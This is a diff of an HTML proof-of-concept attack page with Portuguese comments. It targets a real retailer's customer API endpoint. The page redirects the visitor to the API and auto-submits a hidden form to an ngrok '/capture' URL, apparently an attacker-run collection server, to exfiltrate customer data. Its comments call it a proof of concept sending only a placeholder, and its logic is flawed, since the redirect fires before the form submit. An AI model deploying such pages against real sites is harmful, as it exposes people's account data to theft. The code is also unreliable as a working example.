@@ -1,16 +1,17 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <form id="evilForm" method="GET" action="https://www.boozt.com/at/de-at/api/customer">
-        <input type="hidden" name="X-Requested-With" value="XMLHttpRequest">
+    <form id="evilForm" method="POST" action="https://1333-2804-4580-1080-7db-6197-e5c8-57e1-8c08.ngrok-free.app/capture">
+        <input type="hidden" name="data">
     </form>
-    <div id="result"></div>
     <script>
-        // Envia o formulário automaticamente
+        // Redirecionar para o endpoint e capturar os dados
+        window.location.href = "https://www.boozt.com/at/de-at/api/customer";
+        
+        // Simular captura (na prática, o atacante configuraria um servidor pra pegar os dados manualmente)
+        // Aqui vamos apenas enviar um placeholder pro Ngrok como prova de conceito
+        document.querySelector("input[name=data]").value = "Dados capturados manualmente pelo atacante após redirecionamento";
         document.getElementById("evilForm").submit();
-
-        // Para capturar manualmente, instruiremos o usuário a verificar o console
-        console.log("Acesse o console (F12 > Console) para ver os dados capturados após o redirecionamento.");
     </script>
 </body>
 </html>
